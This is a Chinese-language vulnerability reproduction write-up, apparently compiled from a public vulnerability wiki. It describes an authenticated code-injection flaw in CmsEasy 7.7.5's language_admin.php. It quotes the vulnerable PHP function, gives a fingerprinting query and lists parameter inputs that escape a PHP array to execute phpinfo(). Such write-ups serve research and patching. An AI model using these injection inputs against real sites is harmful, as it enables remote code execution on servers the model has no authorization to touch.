---
title: "CmsEasy language_admin.php 后台命令执行漏洞"
date: 2026-10-12 09:00:09
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "CmsEasy"
tags:
  - "CmsEasy"
  - "命令执行"
  - "任意文件写入"
  - "漏洞复现"
---
## 漏洞描述

CmsEasy 后台存在命令执行漏洞，通过文件 language_admin.php 对部分文件进行写入操作，导致任意文件写入

## 漏洞影响

```
CmsEasy V7.7.5_20210919
```

## 网络测绘

```
body="cmseasyedit"
```

## 漏洞复现

![image-20220518143113914](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181433140.png)

存在漏洞的文件为 `lib/admin/language_admin.php`

![image-20220518143419336](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181434423.png)

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">function add_action() {
        $lang_choice='system.php';
        if (isset(&#36;_GET['lang_choice'])){
            $lang_choice=&#36;_GET['lang_choice'];
        }
        if (front::post('submit')) {
            $langid=front::get('id');
            $lang=new lang();
            $langdata = $lang-&gt;getrows('id='.$langid, 1);
            if (is_array($langdata)){
                $langurlname=$langdata[0]['langurlname'];
            }else{
                front::alert(lang_admin('language_pack').lang_admin('nonentity'));
            }
            $path=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;
            $tipspath=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;
            $content=file_get_contents($path);
            $tipscontent=file_get_contents($tipspath);
            $replace="'".front::$post['key']."'=&gt;'".front::$post['val']."',";
            $tipsreplace="'".front::$post['key']."'=&gt;'".front::$post['cnnote']."',";
            $content=str_replace(');',"\n".$replace.');',$content);
            file_put_contents($path,$content);
            $pos=strpos($tipscontent,$tipsreplace);
            if ($langurlname != 'cn'&amp;&amp;$pos === false) {
                $tipscontent=str_replace(');',"\n".$tipsreplace.');',$tipscontent);
                file_put_contents($tipspath,$tipscontent);
            }
            if (&#36;_GET['site'] != 'default') {
                $ftp=new nobftp();
                $ftpconfig=config::get('website');
                $ftp-&gt;connect($ftpconfig['ftpip'],$ftpconfig['ftpuser'],$ftpconfig['ftppwd'],$ftpconfig['ftpport']);
                $ftperror=$ftp-&gt;returnerror();
                if ($ftperror) {
                    exit($ftperror);
                }
                else {
                    $ftp-&gt;nobchdir($ftpconfig['ftppath']);
                    $ftp-&gt;nobput($ftpconfig['ftppath'].'/lang/'.$langurlname.'/'.$lang_choice,$path);
                }
            }
            event::log(lang_admin('add_to').lang_admin('language_pack'),lang_admin('success'));
            //
            $shepi='&lt;script type="text/javascript"&gt;alert("'.lang_admin('dosomething').lang_admin('complete').'");gotoinurl("'.url('language/edit/id/'.$langdata[0]['id'],true);
            $shepi=$shepi.'&amp;lang_choice='.$lang_choice;
            $shepi=$shepi.'");&lt;/script&gt;';
            echo $shepi;
            //exit;
            //front::refresh(url('language/edit',true));
        }
        $this-&gt;view-&gt;lang_choice=$lang_choice;
    }</code></pre>

</details>

访问这个页面

![image-20220518143447023](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181434089.png)

其中参数有三个，分别为 `key , cnnote, val`

![image-20220518143502867](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181435903.png)

传入参数后,查看 `lang/cn/system_custom.php` 文件中

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">&lt;?php
/*
 *中文语言包
 */

return

array(


'2'=&gt;'3',);
?&gt;</code></pre>

</details>

由于没有对传入的参数进行过滤，通过写入特殊的参数就可以逃逸出数组造成命令执行

分别传入两次参数

```
test1  test2  test3);
```

写入后文件内容

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">&lt;?php
/*
 *中文语言包
 */

return

array(

'test2'=&gt;'test3);',);
?&gt;</code></pre>

</details>

再传入一次参数

```
test4  ,test5, 	,phpinfo());/*
```

![image-20220518143515689](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181435729.png)

写入后文件内容

![image-20220518143533909](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181435970.png)

访问文件 `/lang/cn/system_custom.php`

![image-20220518143552076](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181435144.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/CmsEasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
